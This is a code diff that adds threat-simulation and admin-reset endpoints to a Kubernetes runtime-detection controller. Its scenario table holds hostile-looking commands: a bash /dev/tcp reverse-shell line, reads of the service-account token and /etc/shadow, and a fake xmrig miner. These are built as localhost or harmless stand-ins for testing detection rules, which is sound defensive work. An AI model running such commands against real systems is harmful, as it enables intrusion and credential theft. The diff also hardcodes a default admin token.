@@ -13,10 +13,13 @@ import time
 from collections import deque
 from typing import Optional
 
+import uuid
 import uvicorn
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
 from kubernetes import client, config
+from kubernetes.stream import stream
+from pydantic import BaseModel, Field
 
 from decision import DecisionEngine, evaluate_dry_run
 
@@ -122,6 +125,72 @@ class AlertStore:
 
 store = AlertStore()
 engine = DecisionEngine(strategy=get_strategy())
+
+# Simulation scenarios configuration
+simulation_lock = threading.Lock()
+
+SIMULATION_SCENARIOS = {
+    "E1": {
+        "name": "Shell",
+        "subtitle": "kubectl exec sh",
+        "expected_rules": ["RTM-001"],
+        "command": ["sh", "-c", "echo rtm-test-e1-shell"],
+        "desc": "Spawns a shell inside the test victim container (TTY not required)",
+    },
+    "E2": {
+        "name": "Token Read",
+        "subtitle": "fires RTM-001 + RTM-003",
+        "expected_rules": ["RTM-001", "RTM-003"],
+        "command": ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null"],
+        "desc": "Accesses ServiceAccount token path (output discarded for credential safety)",
+    },
+    "E3": {
+        "name": "Binary in /tmp",
+        "subtitle": "RTM-005",
+        "expected_rules": ["RTM-005"],
+        "command": ["sh", "-c", "cp /bin/ls /tmp/vx && /tmp/vx / > /dev/null 2>&1; rm -f /tmp/vx"],
+        "desc": "Executes harmless test binary (/bin/ls) from /tmp and cleans up",
+    },
+    "E4": {
+        "name": "Reverse Shell",
+        "subtitle": "RTM-007",
+        "expected_rules": ["RTM-007"],
+        "command": ["bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || true"],
+        "desc": "Safe lab simulation of /dev/tcp redirection pattern (immediate localhost RST)",
+    },
+    "E5": {
+        "name": "Sensitive File",
+        "subtitle": "RTM-002",
+        "expected_rules": ["RTM-002"],
+        "command": ["sh", "-c", "cat /etc/shadow >/dev/null 2>&1 || true"],
+        "desc": "Attempts read of /etc/shadow (output discarded for credential safety)",
+    },
+    "E6": {
+        "name": "Package Tool",
+        "subtitle": "RTM-004",
+        "expected_rules": ["RTM-004"],
+        "command": ["sh", "-c", "pip --version >/dev/null 2>&1"],
+        "desc": "Executes package manager/download tool (pip --version) inside container",
+    },
+    "E7": {
+        "name": "Public Egress",
+        "subtitle": "RTM-006",
+        "expected_rules": ["RTM-006"],
+        "command": ["curl", "-m", "2", "-s", "-o", "/dev/null", "https://1.1.1.1"],
+        "desc": "Attempts outbound connect to public IP (1.1.1.1:443 with 2s timeout)",
+    },
+    "E8": {
+        "name": "Crypto Miner",
+        "subtitle": "RTM-008",
+        "expected_rules": ["RTM-008"],
+        "command": ["sh", "-c", "cp /bin/sleep /tmp/xmrig && /tmp/xmrig 0.1 && rm -f /tmp/xmrig"],
+        "desc": "Harmless process-name stand-in (/bin/sleep copied to /tmp/xmrig) and cleaned up",
+    },
+}
+
+class SimulationRequest(BaseModel):
+    scenario: str = Field(..., description="Predefined scenario identifier: E1, E2, E3, E4, E5, E6, E7, or E8")
+
 app = FastAPI(title="rtm-controller")
 
 # ---------------------------------------------------------------------------
@@ -134,11 +203,13 @@ app.add_middleware(
     allow_origins=[
         "http://localhost:5173",
         "http://localhost:8080",
+        "http://localhost:8000",
         "http://127.0.0.1:5173",
         "http://127.0.0.1:8080",
+        "http://127.0.0.1:8000",
         "null",   # allows file:// origins (index.html opened directly in browser)
     ],
-    allow_methods=["GET"],
+    allow_methods=["GET", "POST", "OPTIONS"],
     allow_headers=["*"],
 )
 
@@ -192,6 +263,131 @@ def pods_status(namespace: str = "shop"):
             "restart_count": restart_count,
         })
     return {"namespace": namespace, "pods": result}
+
+
+@app.get("/simulate/scenarios")
+def get_simulation_scenarios():
+    """Return available predefined simulation scenarios."""
+    return {
+        "scenarios": [
+            {
+                "id": k,
+                "name": v["name"],
+                "subtitle": v["subtitle"],
+                "expected_rules": v["expected_rules"],
+                "desc": v["desc"],
+            }
+            for k, v in SIMULATION_SCENARIOS.items()
+        ]
+    }
+
+
+@app.post("/simulate")
+def inject_threat(req: SimulationRequest):
+    """Trigger a controlled threat simulation on the designated test workload in namespace 'shop'.
+
+    Safety invariants:
+    - Only predefined scenarios (E1, E2, E3, E4) are accepted.
+    - Commands are strictly server-side constants. Arbitrary commands, parameters, or targets are rejected.
+    - Execution is restricted to the test namespace 'shop' and pod matching 'app=victim'.
+    - Concurrency is guarded via a non-blocking lock to prevent overlapping runs.
+    - Output is redirected/discarded so credentials or secrets are never exposed.
+    - Alerts are NOT synthesized here; detection is confirmed only via the real Falco -> Falcosidekick pipeline.
+    """
+    scenario_id = req.scenario.strip().upper() if req.scenario else ""
+    if scenario_id not in SIMULATION_SCENARIOS:
+        raise HTTPException(
+            status_code=400,
+            detail=f"Invalid scenario '{req.scenario}'. Allowed values: {', '.join(sorted(SIMULATION_SCENARIOS.keys()))}",
+        )
+
+    scen = SIMULATION_SCENARIOS[scenario_id]
+
+    if v1_api is None:
+        raise HTTPException(
+            status_code=503,
+            detail="Kubernetes client unavailable on controller; cannot execute simulation.",
+        )
+
+    # Concurrency check
+    acquired = simulation_lock.acquire(blocking=False)
+    if not acquired:
+        raise HTTPException(
+            status_code=409,
+            detail="A threat simulation is already in progress. Please wait for it to complete.",
+        )
+
+    try:
+        # Locate designated victim workload in shop namespace
+        try:
+            pod_list = v1_api.list_namespaced_pod(namespace="shop", label_selector="app=victim")
+        except Exception as e:
+            raise HTTPException(status_code=500, detail=f"Failed to query Kubernetes pods: {e}")
+
+        running_pods = [
+            p for p in pod_list.items
+            if p.status.phase == "Running" and not getattr(p.metadata, "deletion_timestamp", None)
+        ]
+
+        if not running_pods:
+            raise HTTPException(
+                status_code=503,
+                detail="Designated test victim pod ('app=victim') is not running in namespace 'shop'.",
+            )
+
+        target_pod = running_pods[0].metadata.name
+        sim_id = f"sim-{uuid.uuid4().hex[:8]}"
+        start_ts = time.time()
+
+        logger.info(
+            "Starting threat simulation %s scenario=%s target=shop/%s",
+            sim_id, scenario_id, target_pod
+        )
+
+        try:
+            exec_api = client.CoreV1Api(client.ApiClient())
+            resp = stream(
+                exec_api.connect_post_namespaced_pod_exec,
+                name=target_pod,
+                namespace="shop",
+                command=scen["command"],
+                stderr=True,
+                stdin=False,
+                stdout=True,
+                tty=False,
+                _request_timeout=15,
+            )
+        except Exception as e:
+            logger.error("Simulation %s execution failed: %s", sim_id, e)
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to execute simulation {scenario_id} in pod {target_pod}: {str(e)}",
+            )
+
+        duration = time.time() - start_ts
+        logger.info(
+            "Completed threat simulation %s scenario=%s in %.2fs",
+            sim_id, scenario_id, duration
+        )
+
+        return {
+            "status": "completed",
+            "simulation_id": sim_id,
+            "scenario": scenario_id,
+            "scenario_name": scen["name"],
+            "subtitle": scen["subtitle"],
+            "expected_rules": scen["expected_rules"],
+            "target": {
+                "namespace": "shop",
+                "pod": target_pod,
+                "container": "victim",
+            },
+            "executed_at": start_ts,
+            "duration_s": round(duration, 3),
+            "message": f"Simulation {scenario_id} completed successfully in shop/{target_pod}. Awaiting Falco detection.",
+        }
+    finally:
+        simulation_lock.release()
 
 
 @app.post("/alerts")
@@ -323,6 +519,70 @@ async def receive_alert(request: Request):
     logger.info(json.dumps(decision_record, separators=(",", ":")))
 
     return {"received": True, "stored": True, "decision": decision_record}
+
+
+
+# ---------------------------------------------------------------------------
+# Admin: Reset test results
+# Protected by a static token delivered via ADMIN_TOKEN env var.
+# In demo / local environments the token defaults to "rtm-reset-dev-token".
+# Set a strong random value when running in any shared or production cluster.
+# ---------------------------------------------------------------------------
+ADMIN_TOKEN: str = os.getenv("ADMIN_TOKEN", "rtm-reset-dev-token")
+
+
+@app.post("/admin/reset-test-results")
+async def reset_test_results(request: Request):
+    """Clear all in-memory test state for a clean evaluation run.
+
+    Clears:
+    - Alert ring buffer (store)
+    - Decision engine dedupe timestamps (_pod_last_seen)
+    - Decision engine pod event history (_pod_history)
+    - Decision engine already-taken action tracking (_actions_taken)
+
+    Does NOT:
+    - Change STRATEGY, DRY_RUN, window sizes, or enforcement selectors.
+    - Affect Falco's own kernel/log state.
+    - Reverse previously executed Kubernetes mitigation actions.
+    - Cancel any running simulation.
+
+    Authorization: requires the header  X-RTM-Admin-Token: <ADMIN_TOKEN>
+    """
+    token = request.headers.get("X-RTM-Admin-Token", "")
+    if not token or token != ADMIN_TOKEN:
+        raise HTTPException(
+            status_code=401,
+            detail="Missing or invalid X-RTM-Admin-Token header.",
+        )
+
+    # Acquire simulation_lock briefly so we don't reset mid-simulation.
+    acquired = simulation_lock.acquire(blocking=True, timeout=5)
+    if not acquired:
+        raise HTTPException(
+            status_code=409,
+            detail="A simulation is currently running; retry after it completes.",
+        )
+    try:
+        store.clear()
+        with threading.Lock():
+            engine._pod_history.clear()
+            engine._pod_last_seen.clear()
+            engine._actions_taken.clear()
+        cleared_at = time.time()
+    finally:
+        simulation_lock.release()
+
+    logger.info("Admin reset: alert store and decision engine state cleared at %.3f", cleared_at)
+    return {
+        "status": "reset_complete",
+        "cleared_at": cleared_at,
+        "message": (
+            "Alert history, deduplication timestamps, pod event history, and "
+            "action-tracking state have been cleared. "
+            "Strategy, windows, and safety settings are unchanged."
+        ),
+    }
 
 
 if __name__ == "__main__":
